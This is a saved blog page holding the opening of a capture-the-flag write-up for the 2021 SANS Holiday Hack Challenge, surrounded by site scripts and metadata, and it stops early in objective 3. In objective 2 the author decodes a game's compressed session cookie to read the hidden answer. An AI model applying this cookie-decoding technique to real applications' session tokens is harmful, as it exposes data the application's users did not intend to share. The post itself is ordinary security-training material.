      if (e.key === 'ArrowDown' || keyCode === 40) {
        if (activeIndex === null) {
          activeIndex = 0;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === items.length - 1 ? 0 : activeIndex + 1;
        }
        items[activeIndex].classList.add('is-active');

        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel > 0) {
          document.querySelector(".search-content").scrollTop += items[activeIndex].getBoundingClientRect().height;
        } else if (activeIndex === 0) {
          document.querySelector(".search-content").scrollTop = 0;
        }
      } else if (e.key === 'ArrowUp' || keyCode === 38) {
        if (activeIndex === null) {
          activeIndex = items.length - 1;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === 0 ? items.length - 1 : activeIndex - 1;
        }
        items[activeIndex].classList.add('is-active');
        
        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel < 0) {
          document.querySelector(".search-content").scrollTop -= items[activeIndex].getBoundingClientRect().height;
        } else {
          document.querySelector(".search-content").scrollTop = overflowedPixel + items[activeIndex].getBoundingClientRect().height;
        }
      } else if (e.key === 'Enter' || keyCode === 13) {
        if (items[activeIndex] && items[activeIndex].getAttribute('href')) {
          location.href = items[activeIndex].getAttribute('href');
        }
      } else if (e.key === 'Escape' || keyCode === 27) {
        e.target.value = null;
        if (searchResults) {
          searchResults.classList.remove('is-active');
        }
      }
    }) : null;

    searchMobile ? 
    searchMobile.addEventListener('input', function(e) {
      if (!e.target.value) {
        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild);
        }
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      renderSearchResultsMobile(searchText, results);
      if (enableSearchHighlight) {
        renderSearchHighlightResultsMobile(searchText, results);
      } else {
        renderSearchResultsMobile(searchText, results);
      }
    }) : null;
  


  
    var mobileSearchInputElem = document.querySelector('#search-mobile');
    var mobileSearchClassElem = document.querySelector('.mobile-search');
    var mobileSearchBtnElems = document.querySelectorAll('.navbar-search');
    var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
    var mobileSearchContainer = document.querySelector('#search-mobile-container');
    var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
    var htmlElem = document.querySelector('html');

    if (mobileSearchClassElem) {
      mobileSearchClassElem.style.display = 'none';
    }

    mobileSearchBtnElems ? 
    mobileSearchBtnElems.forEach(function (elem, idx) {
      elem.addEventListener('click', function () {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'block';
        }

        if (mobileSearchInputElem) {
          mobileSearchInputElem.focus();
        }

        if (htmlElem) {
          htmlElem.style.overflowY = 'hidden';
        }
      });
    }) : null;

    mobileSearchCloseBtnElem ? 
    mobileSearchCloseBtnElem.addEventListener('click', function() {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'none';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.value = '';
      }
      
      if (mobileSearchResultsElem) {
        while (mobileSearchResultsElem.firstChild) {
          mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
        }
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'visible';
      }
    }) : null;

    mobileSearchInputElem ?
    mobileSearchInputElem.addEventListener('keydown', function(e) {
      var keyCode = e.which || e.keyCode;
      if (e.key === 'Escape' || keyCode === 27) {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'none';
        }
        
        if (mobileSearchInputElem) {
          mobileSearchInputElem.value = '';
        }

        if (mobileSearchResultsElem) {
          while (mobileSearchResultsElem.firstChild) {
            mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
          }
        }
        if (htmlElem) {
          htmlElem.style.overflowY = 'visible';
        }
      }
    }) : null;
  


  
    function renderSearchResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');
      
      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }

    function renderSearchHighlightResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');

      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeHighlightLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }
  
  });
</script>    
    


<link rel="stylesheet" href="/css/main.min.css">



  
  
    
    <link rel="stylesheet" href="/css/custom.min.css">
  

  
  
    
    <link rel="stylesheet" href="/css/font.min.css">
  

  
  
    
    <link rel="stylesheet" href="/scss/search.min.css">
  


    
<meta name="description" content="The fourth edition of Kringlecon! This year challenges were covering webapp hacking (SQLi, SSRF), binary analysis, digital forensics (logs and network capture analysis), Active Directory attacks, learning Python and shellcoding, some encryption attack, analyzing an IMDS service and FPGA programming. Two challenges on Log4Shell were added as well during the challenge." />


<meta name="keywords" content="kringlecon,holidayhack">

<meta name="created" content="2022-01-07T00:00:00&#43;0000">
<meta name="modified" content="2022-01-07T00:00:00&#43;0000">
<meta property="article:published_time" content="2022-01-07T00:00:00&#43;0000">

<meta name="author" content="noobintheshell">
<meta property="article:author" content="https://noobintheshell.com/posts/kringlecon4/@noobintheshell">


<meta property="og:site_name" content="noobintheshell :: blog">
<meta property="og:title" content="KringleCon 4: Calling Birds">
<meta property="og:url" content="https://noobintheshell.com/posts/kringlecon4/">
<meta property="og:type" content="article">
<meta property="og:description" content="The fourth edition of Kringlecon! This year challenges were covering webapp hacking (SQLi, SSRF), binary analysis, digital forensics (logs and network capture analysis), Active Directory attacks, learning Python and shellcoding, some encryption attack, analyzing an IMDS service and FPGA programming. Two challenges on Log4Shell were added as well during the challenge.">

  
    <meta property="og:image" content="https://noobintheshell.com/images/kringlecon4/header.webp">
    <meta property="og:image:url" content="https://noobintheshell.com/images/kringlecon4/header.webp">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:app:name:iphone" content="noobintheshell :: blog">
    <meta property="twitter:title" content="KringleCon 4: Calling Birds">
    <meta property="twitter:description" content="The fourth edition of Kringlecon! This year challenges were covering webapp hacking (SQLi, SSRF), binary analysis, digital forensics (logs and network capture analysis), Active Directory attacks, learning Python and shellcoding, some encryption attack, analyzing an IMDS service and FPGA programming. Two challenges on Log4Shell were added as well during the challenge.">
  

<meta name="generator" content="Hugo 0.79.0" />
<meta name="msapplication-TileColor" content="#fff">

<meta name="theme-color" content="#fff">

<meta name="msapplication-navbutton-color" content="#fff">

<meta name="apple-mobile-web-app-status-bar-style" content="#fff">

<link rel="canonical" href="https://noobintheshell.com/posts/kringlecon4/">

<link rel="manifest" href="/manifest.json">

  
  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/favicon.png" sizes="any" type="image/png" />
  


    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "headline": "KringleCon 4: Calling Birds",
    "datePublished": "2022-01-07T00:00:00Z",
    "dateModified": "2022-01-07T00:00:00Z",
    "url" : "https://noobintheshell.com/posts/kringlecon4/",
    "description": "The fourth edition of Kringlecon! This year challenges were covering webapp hacking (SQLi, SSRF), binary analysis, digital forensics (logs and network capture analysis), Active Directory attacks, learning Python and shellcoding, some encryption attack, analyzing an IMDS service and FPGA programming. Two challenges on Log4Shell were added as well during the challenge.",
    "keywords": ["kringlecon","holidayhack"],
    "image" : "https://noobintheshell.com/images/kringlecon4/header.webp",
    "author": {
      "@type": "Person",
      "name": "noobintheshell"
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://noobintheshell.com"
    },
    "publisher": {
      "@type": "Organization",
      "name": "noobintheshell :: blog",
      "url": "https://noobintheshell.com"
    }
  }
</script>

    
  
  







    
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
<script src="https://unpkg.com/lunr/lunr.min.js"></script>


<script async src="https://www.googletagmanager.com/gtag/js?id=G-RVT4CS59SP"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-RVT4CS59SP');
</script>
</head>

<body id="root" class="theme__dark">
    <script>
        var localTheme = localStorage.getItem('theme');
        if (localTheme) {
            document.getElementById('root').className = 'theme__' + localTheme;
        }
    </script>
    <div id="container">
        





        <div class="wrapper" data-type="posts" data-kind="page">
            <nav class="navbar scrolling" role="navigation" aria-label="main navigation" data-dir="ltr">
  <div class="navbar__brand">
    
    &nbsp;&nbsp;
    
    
      <a href="/" title="Home" rel="home" class="navbar__title-link">
        <h6 class="navbar__title">#noobintheshell_</h6>
      </a>
    
  </div>

  
<div class="theme theme-mobile" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" style="position: absolute; top: 0;" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
      
    </div>
  </div>
</div>



<a role="button" class="navbar__burger" aria-label="menu" aria-expanded="false"
  data-ani="true">
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
</a>
<div class="navbarm__collapse" data-open="false">
  <ul dir="ltr">
    
    
      
      
      
      

      
        <li class="navbarm__menu--item active">
          <a href="/posts">Posts</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/archive">Archive</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/tags">Tags</a>
        </li>
      
      
    

    
      <li class="navbarm__menu--item ">
        <a href="/tags" class="navbarm__menu--term" data-index="0">
          Tags
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/categories" class="navbarm__menu--term" data-index="1">
          Categories
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/series" class="navbarm__menu--term" data-index="2">
          Series
        </a>
      </li>
    
  </ul>
</div>
  <div class="navbar__menu">
  
  
  
<div class="theme" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
      
    </div>
  </div>
</div>

  
  
  
  
  
  
  
  <a href="/posts" class="navbar__menu-item navbar__slide-down active" dir="ltr" data-ani="true">Posts</a>
  
  
  
  
  
  
  
  <a href="/archive" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Archive</a>
  
  
  
  
  
  
  
  <a href="/tags" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Tags</a>
  
  
  <div class="show-search">
    <a class="toggle-search" title="search posts">
        <svg xmlns="http://www.w3.org/2000/svg" width="34" height="35" viewBox="-100 100 800 680">
            <path
                d="M595.2 513.908L493.775 412.482c26.707-41.727 42.685-91.041 42.685-144.263C536.459 120.085 416.375 0 268.24 0 120.106 0 .021 120.085.021 268.219c0 148.134 120.085 268.22 268.219 268.22 53.222 0 102.537-15.979 144.225-42.686l101.426 101.463c22.454 22.453 58.854 22.453 81.271 0 22.492-22.491 22.492-58.855.038-81.308zm-326.96-54.103c-105.793 0-191.585-85.793-191.585-191.585 0-105.793 85.792-191.585 191.585-191.585s191.585 85.792 191.585 191.585c.001 105.792-85.791 191.585-191.585 191.585z" />
        </svg>
    </a>
</div>
<aside role="search">
        <div class="search-wrapper">
            <div class="close toggle-search">
                <svg height="512" width="512" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                    <path d="M443.6 387.1L312.4 255.4l131.5-130c5.4-5.4 5.4-14.2 0-19.6l-37.4-37.6c-2.6-2.6-6.1-4-9.8-4-3.7 0-7.2 1.5-9.8 4L256 197.8 124.9 68.3c-2.6-2.6-6.1-4-9.8-4-3.7 0-7.2 1.5-9.8 4L68 105.9c-5.4 5.4-5.4 14.2 0 19.6l131.5 130L68.4 387.1c-2.6 2.6-4.1 6.1-4.1 9.8 0 3.7 1.4 7.2 4.1 9.8l37.4 37.6c2.7 2.7 6.2 4.1 9.8 4.1 3.5 0 7.1-1.3 9.8-4.1L256 313.1l130.7 131.1c2.7 2.7 6.2 4.1 9.8 4.1 3.5 0 7.1-1.3 9.8-4.1l37.4-37.6c2.6-2.6 4.1-6.1 4.1-9.8-.1-3.6-1.6-7.1-4.2-9.7z"/></svg>
            </div>
            <form class="search_" method="get">
                <input type="search" placeholder="search..." disabled="disabled" />
            </form>

            <ul class="search-results">
                <li>
                </li>
            </ul> 
        </div>
</aside>

<script src="/js/search.min.e175b5801e0cbeca86c1e68a630de9556a6728307033f4efb8c956e9e1587cc1.js"></script>
</div>
</nav>
            
            

<main class="single__main main-main">
  
    <nav class="breadcrumb hide" aria-label="breadcrumbs">
  <script>document.querySelector('.breadcrumb').classList.remove('hide')</script>
  <ol>
    
  
  
  
  
  
  <li >
    
      <a href="https://noobintheshell.com/" class="capitalize">Home</a>
    
  </li>
  
  
  <li >
    
      <a href="https://noobintheshell.com/posts/" class="capitalize">Posts</a>
    
  </li>
  
  
  <li  class="is-active" >
    
      <span>KringleCon 4: Calling Birds</span>
    
  </li>
  
  </ol>
  
</nav>
  
  
  <div class="single ">
    <div class="single__nojs">This page looks best with JavaScript enabled</div>
    <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
    <h2 class="single__title" data-ani="true">KringleCon 4: Calling Birds</h2>
    <h3 class="single__subtitle">The 2021 SANS HolidayHack Challenge</h3>
    <div class="single__meta">
      
<div class="single__infos">
  <time class="single__info" title="Written At">📅 &nbsp;Jan 7, 2022 </time>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;81&nbsp;min read </span>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">🎅&nbsp;noobintheshell</span>
  
  <span class="single__info">
    
  </span>
</div>

      
<ul class="single__tags caption">
  
  🏷️
  

  <li><a href="https://noobintheshell.com/tags/kringlecon/" class="single__tag" title="kringlecon">#kringlecon</a></li>

  <li><a href="https://noobintheshell.com/tags/holidayhack/" class="single__tag" title="holidayhack">#holidayhack</a></li>

</ul>

    </div>
    <article class="single__contents" data-dir="ltr" data-ani="true">
      
      



  



  <div class="featured-image__wrapper">
    <img src="/images/kringlecon4/header.webp" alt="Featured Image" class="featured-image" style="width: ;height: ;">
  </div>

<h5 id="the-_sans-holiday-hack-challenge_-is-back-and-with-it-the-fourth-edition-of-_kringlecon_-and-jack-frost">The <em>SANS Holiday Hack Challenge</em> is back! And with it, the fourth edition of <em>KringleCon</em> and <strong>Jack Frost</strong>!</h5>
<h6 id="the-fourth-edition-of-kringlecon-was-a-blast-this-year-challenges-were-covering-webapp-hacking-sqli-ssrf-business-logic-issues-binary-analysis-digital-forensics-logs-and-network-capture-analysis-active-directory-attacks-learning-python-and-shellcoding-some-encryption-attack-analyzing-an-imds-service-and-fpga-programming-two-challenges-on-log4shell-were-added-as-well-during-the-challenge">The fourth edition of <em>Kringlecon</em> was a blast! This year challenges were covering webapp hacking (SQLi, SSRF, business logic issues), binary analysis, digital forensics (logs and network capture analysis), Active Directory attacks, learning Python and shellcoding, some encryption attack, analyzing an IMDS service and FPGA programming. Two challenges on Log4Shell were added as well during the challenge.</h6>
<h6 id="kringlecon-is-as-well-an-online-security-conference-and-you-can-find-all-the-talks-on-kringlecons-youtube-channelhttpswwwyoutubecomchannelucnir-c_vxv_tcfgww5vczag-the-same-discordhttpsdiscordggwbmx92rww3-channel-as-last-year-was-available-interact-with-the-community">KringleCon is as well an online security conference and you can find all the talks on <a href="https://www.youtube.com/channel/UCNiR-C_VXv_TCFgww5Vczag">KringleCon’s Youtube channel</a>. The same <a href="https://discord.gg/Wbmx92rWW3">Discord</a> channel as last year was available interact with the community.</h6>
<h6 id="a-special-thanks-goes-to-the-whole-counter-hackhttpstwittercomcounterhackseclangen-team-for-their-incredible-work-each-year-the-bar-is-raised">A special thanks goes to the whole <a href="https://twitter.com/counterhacksec?lang=en">Counter Hack</a> team for their incredible work! Each year the bar is raised!</h6>
<h2 id="objectives">Objectives</h2>
<h3 id="1---kringlecon-orientation">1 - KringleCon Orientation</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objectives</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>1/5</td>
<td>Talk to Jingle Ringford - Jingle will start you on your journey!</td>
<td>Orientation</td>
</tr>
<tr>
<td>1/5</td>
<td>Get your badge - Pick up your badge</td>
<td>Orientation</td>
</tr>
<tr>
<td>1/5</td>
<td>Get the wifi adapter - Pick up the wifi adapter</td>
<td>Orientation</td>
</tr>
<tr>
<td>1/5</td>
<td>Use the terminal - Click the computer terminal</td>
<td>Orientation</td>
</tr>
</tbody>
</table>
<p>For the first objective, there is no real challenge. This is a prologue where we need to talk to the elf then grab a <em>Wi-Fi Dongle</em> on the floor.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj01_02.webp" alt="Objective 1 location" data-caption="Objective 1 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 1 location
      
        
        
      
    </figcaption>
  
</figure>
<p>The dongle gives us access to a new version of the <em>Cranberry Pi</em> with <em>Wi-Fi</em> support that we can access from the main menu.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj01_03.webp" alt="*Cranberry Pi* with *Wi-Fi* support" data-caption="Cranberry Pi with Wi-Fi support" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Cranberry Pi with Wi-Fi support
      
        
        
      
    </figcaption>
  
</figure>
<p>A <em>Cranberry Pi</em> appears after that on the table next to the elf. We open the terminal and follow the instruction (enter <code>answer</code> in the top pane) to validate the objective and open the gate to <em>Santa</em>&rsquo;s castle.</p>
<h3 id="2---where-in-the-world-is-caramel-santaigo">2 - Where in the World is Caramel Santaigo</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Courtyard</th>
</tr>
</thead>
<tbody>
<tr>
<td>1/5</td>
<td>Help Tangle Coalbox find a wayward elf in <em>Santa</em>&rsquo;s courtyard. Talk to <strong>Piney Sappington</strong> nearby for hints.</td>
<td>Courtyard</td>
</tr>
</tbody>
</table>
<p>We access an <em>OSINT</em> game called <em>Where in the World is Caramel Santaigo</em>.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj02_04.webp" alt="WHERE IN THE WORLD IS CARAMEL SANTAIGO?" data-caption="WHERE IN THE WORLD IS CARAMEL SANTAIGO?" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      WHERE IN THE WORLD IS CARAMEL SANTAIGO?
      
        
        
      
    </figcaption>
  
</figure>
<p>The goal is to follow the steps of an elf around the world. To help with that we get 3 hints for each places he visited along the way when using the <code>Investigate</code> button. By using the <code>Depart by sleigh</code> button, we get 3 possible destinations. Only one is right. Moreover, each time we do an action, we lose 1 hour. We start on Monday 9am at <strong>Santa</strong>&rsquo;s castle and need to find the elf by Sunday.</p>
<p>Each time the game is restarted, the hints and the locations are randomized. There are 3 cities to visit only and at the end we need to find who was the elf we followed. We can use the <code>Visit Interink</code> along the way to help narrowing down the elf based on the hints we get.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj02_05.webp" alt="Investigation start" data-caption="Investigation start" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Investigation start
      
        
        
      
    </figcaption>
  
</figure>
<p>We can play the game normally and complete it quite easily by reading the hints everytime. But where is the fun? Let&rsquo;s analyze the application and the calls that are done to see if we can cheat.</p>
<p>As soon as we start the game, we get a weird cookie called <code>Cookiepella</code> with a value that looks like a <em>JWT</em> token. Here is an example:</p>
<div class="box">.eJyFUktz0zAQ_is74sDFYWzHsdPcSqdAZoB2mnJgEg5raW0Ly5JHlpMJnf53Vm25UbjZ-720jwdBphEbsRvR94bgjlRN3p9FEoFP2oZJbPbiviPgfxjIBu0sKZjcQKHTtgWs3RxgF1D2cHMk3xh3ArQKrt68Y5ubLoEtWBe0ZFno6AwdKsCo8HDvqY_FgbGxY2eQOFHU_YlsXQBPaAzrCAPzngPnKYZPI0qaoHEetFX8uulFe4aexgCyI9lHImdojjvpEMgDjmPkdeiV-JEI4yTGvuIg0AZ8O8EVTsEQc9wYkTiFvfhKJ_jufJ_At90lY9dK23r2Lbe4ky4Y7pqrX5wN_jCnKV2gSdjJokKO2Ys7Ovc_8fiEKXbZSnrR3HpsZ2LyL5Idb2Gca6MlA5-dVc4mcG3bJ2q0ubThRH5M4D2ZVs8D03ZhDqFFHxL4SH5AGzf4WtwrHreGZ9k5o8hHsTui1TToBD5o-6zjUXn-cMOOSIlNXmVc4GVQvJG_t_2P1v7zBA47ahmcP9-7nuJuHvhypm5zELIslnRRq6zMaollkVKBWKUyX3OpwTwrVpmqViWuqKnWqkpXVZ5V5XJZ1VgVq-ogEr6pyc1e0lZt4CCKpSyzdZ4vqjJLF0WxXi4wTS8WqNhB5bJZ581BPIrH36DVC60.YdYWfA.hkKTK_joXgSaNT0J768-NW2wD2o</div>
<p>There are 3 different part in this &ldquo;token&rdquo; separated by a dot. The first part is the interesting one. If we <code>Base64-decode</code> it, we see that the resulting hex data starts with <code>0x789c</code> which is the magic header for a <code>ZLIB</code> compression. We can use this <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true)Zlib_Inflate(0,0,'Adaptive',false,false)">CyberChef recipe</a> to decompress that easily. We get:</p>
<div class="box">{&ldquo;elf&rdquo;:&ldquo;Sparkle Redberry&rdquo;,&ldquo;elfHints&rdquo;:[&ldquo;The elf mentioned something about Stack Overflow and C#.&rdquo;,&ldquo;Oh, I noticed they had a Star Trek themed phone case.&rdquo;,&ldquo;The elf got really heated about using spaces for indents.&rdquo;,&ldquo;They kept checking their Twitter app.&rdquo;,&ldquo;hard&rdquo;],&ldquo;location&rdquo;:&ldquo;Santa&rsquo;s Castle&rdquo;,&ldquo;options&rdquo;:[[&ldquo;New York, USA&rdquo;,&ldquo;Edinburgh, Scotland&rdquo;,&ldquo;Montr\u00e9al, Canada&rdquo;],[&ldquo;Reykjav\u00edk, Iceland&rdquo;,&ldquo;Prague, Czech Republic&rdquo;,&ldquo;London, England&rdquo;],[&ldquo;Antwerp, Belgium&rdquo;,&ldquo;Stuttgart, Germany&rdquo;,&ldquo;Reykjav\u00edk, Iceland&rdquo;],[&ldquo;Antwerp, Belgium&rdquo;,&ldquo;Placeholder&rdquo;,&ldquo;Rovaniemi, Finland&rdquo;]],&ldquo;randomSeed&rdquo;:271,&ldquo;route&rdquo;:[&ldquo;Montr\u00e9al, Canada&rdquo;,&ldquo;Prague, Czech Republic&rdquo;,&ldquo;Antwerp, Belgium&rdquo;,&ldquo;Placeholder&rdquo;],&ldquo;victoryToken&rdquo;:&quot;{ hash:&quot;c643e9bd161bca640e4aa70c28d16fa21451d756a5ef78d70572176337ba7457&quot;, resourceId: &quot;43c61822-7610-4483-a009-adef7d2cf82f&quot;}&quot;}</div>
<p>We can read who is the elf that we are following: <code>Sparkle Redberry</code>; as well as the route he took: <code>Montréal =&gt; Prague =&gt; Antwerp</code>.</p>
<p>We can complete the game and the objective with this information!</p>
<h3 id="3---thaw-frost-towers-entrance">3 - Thaw Frost Tower&rsquo;s Entrance</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>2/5</td>
<td>Turn up the heat to defrost the entrance to <em>Frost Tower</em>. Click on the <a href="https://2021.kringlecon.com/badge?section=item">Items</a> tab in your badge to find a link to the <em>Wi-fi Dongle</em>&rsquo;s <em>CLI</em> interface. Talk to <strong>Greasy Gopherguts</strong> outside the tower for tips.</td>
<td>The North Pole</td>
</tr>
</tbody>
</table>
<p>We need to defrost the entrance to the <em>Frost Tower</em> that was frozen by <strong>Jack Frost</strong>. To accomplish that, we need to reach the thermostat inside the building through a <em>Wi-Fi</em> connection.</p>
<figure >
  
  
  
